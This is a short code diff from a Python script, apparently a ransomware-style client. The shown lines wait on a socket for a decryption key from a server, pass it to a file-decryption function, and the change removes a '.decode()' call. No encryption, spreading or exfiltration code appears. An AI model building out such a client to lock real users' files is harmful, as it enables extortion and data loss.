@@ -176,7 +176,7 @@ if __name__ == "__main__":
                     # recv waits for new input of key to decrypt
                     key = secSock.recv(4096)
                     # upon receiving a key from the server, proceed to decrypt files
-                    decryptFiles(key.decode())
+                    decryptFiles(key)
 
                     print("Files have been decrypted.")
                     sys.exit()
